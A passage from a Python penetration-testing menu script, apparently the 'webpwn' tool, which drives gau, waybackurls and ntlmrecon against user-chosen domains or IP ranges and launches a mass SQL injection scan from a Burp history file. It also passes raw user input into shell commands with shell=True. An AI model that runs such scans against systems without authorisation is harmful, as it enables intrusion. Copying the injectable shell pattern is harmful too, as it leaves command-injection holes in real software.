							print(Fore.YELLOW + "[+] Detected domains.txt list!")
							print(Fore.RESET)
							domains_list = pathlib.Path("./subdomains/domains.txt")
							gau_args = "cat ./subdomains/domains.txt | ./tools/gau %s | tee -a subdomains/old_domains.txt" % (domains_list)
							waybackuris_args = "cat ./subdomains/domains.txt | ./tools/waybackurls | tee -a subdomains/old_domains.txt"
							run_gau = check_call(gau_args, shell=True)
							run_waybackuris = check_call(waybackuris_args, shell=True)
							sort_unique=subprocess.Popen(["sort", "-u", "subdomains/old_domains.txt"], stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
							print("Saved results into subdomains/old_domains.txt")
					elif ask_for_domains == "N" or ask_for_domains == "n":
						scope = input("What domain you want to scan? (e.g. google.com): ")
						gau_args = "./tools/gau %s | tee -a subdomains/old_domains.txt" % (scope)
						waybackuris_args = "./tools/waybackurls %s | tee -a subdomains/old_domains.txt" % (scope)
						run_gau = check_call(gau_args, shell=True)
						run_waybackuris = check_call(waybackuris_args, shell=True)
						print("Cleaned up the results with sort unique")
						sort_unique=subprocess.Popen(["sort", "-u", "subdomains/old_domains.txt"], stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
						print("Saved results into subdomains/old_domains.txt")
					else:
						print("Ok!")
				except:
					print("Could not enumerate")	
			elif choice == "q":
				break
			elif choice == "r":
				continue
			else:
				print(Fore.RED + "No valid input detected!")
				print(Fore.RESET)
		
		elif choice == "3":
			check_value = ntlmrecon_checker()
			if check_value == True:
				print("Ok, starting!")
				try:
					pathlib.Path('ntlmrecon').mkdir(parents=True,exist_ok=True)
					if pathlib.Path("./subdomains/domains.txt").is_file():
						if pathlib.Path("./subdomains/domains.txt").stat().st_size != 0:
							print(Fore.YELLOW + "[+] Detected domains.txt list!")
							print(Fore.RESET)
							existing_file = pathlib.Path("./subdomains/domains.txt")
							ntlmrecon_existing_file=str(input("Do you want to scan your existing domains.txt list (Y/N): "))
							if ntlmrecon_existing_file == "Y" or ntlmrecon_existing_file == "y":
								print(subprocess.getoutput('ntlmrecon --infile %s --outfile ntlmrecon/ntlm-endpoints.txt -f' % (existing_file)))
								print(Fore.GREEN + "[+] Saved results into ntlmrecon/ntlm-endpoints.txt")
								print(Fore.RESET)
					ntlmrecon_range=str(input("Do you want to scan a single IP/domain (IP), an IP range (R) or nothing more (N)? (IP/R/N): "))
					if ntlmrecon_range == "r" or ntlmrecon_range == "R":
						ip_range = str(input("Enter your IP range in CIDR notation (e.g. 193.168.2.2/24): "))
						print(subprocess.getoutput('ntlmrecon --input %s --outfile ntlmrecon/ntlm-endpoints.txt -f' % (ip_range)))
						print(Fore.GREEN + "[+] Saved results into ntlmrecon/ntlm-endpoints-range.txt")
						print(Fore.GREEN + "[+] Saved results into ntlmrecon/ntlm-endpoints-range.txt")
						print(Fore.RESET)
					else:
						pass
					if ntlmrecon_range == "IP" or ntlmrecon_range == "ip":
						ip_address=str(input("Enter your IP address or domain name (e.g. 193.168.2.2 or google.com): "))
						print(subprocess.getoutput('ntlmrecon --input %s --outfile ntlmrecon/ntlm-endpoints.txt -f' % (ip_address)))
						print(Fore.GREEN + "[+] Saved results into ntlmrecon/ntlm-endpoints-ip.txt")
						print(Fore.GREEN + "[+] Saved results into ntlmrecon/ntlm-endpoints-ip.txt")
						print(Fore.RESET)
					
					print("See you next time!")
				except:
					print("Something went wrong!")
		elif choice == "4":
		        # print instructions on how to generate the burp history xml file
			print("To generate the burp history xml file:")
			print("1) In Burp Suite, go to the 'HTTP History' tab after browsing your target.")
			print("2) Select 'Show only in scope'.")
			print("3) Press CTRL+A to mark all HTTP requests.")
			print("4) Right click -> 'Save item as...' and save the file as 'sql.xml'.\n")
			# ask the user for the location of the burp history xml file
			burp_history_xml = input("Enter the location of the burp history xml file (default: sql.xml): ")
			# if the user didn't provide a location, use the default value
			if not burp_history_xml:
				burp_history_xml = "sql.xml"
	
			mass_sql_injection(burp_history_xml)  
		elif choice == "q":
			print("Ok, bye!")
			break
		else:
			print(Fore.RED + "\nNo valid input detected!")
			print(Fore.RESET)

# start main functions
if __name__ == "__main__":
	banner()
	# current version of script
	current_version = 'stable-version-1.1'
	repo_owner = 'm-cetin'
	repo_name = 'webpwn'
	
	check_for_update(repo_owner, repo_name, current_version)
	
	try:
		main_menu()
	except KeyboardInterrupt:
		print(Fore.RED+"\nKey event detected, closing..")
		exit(0)
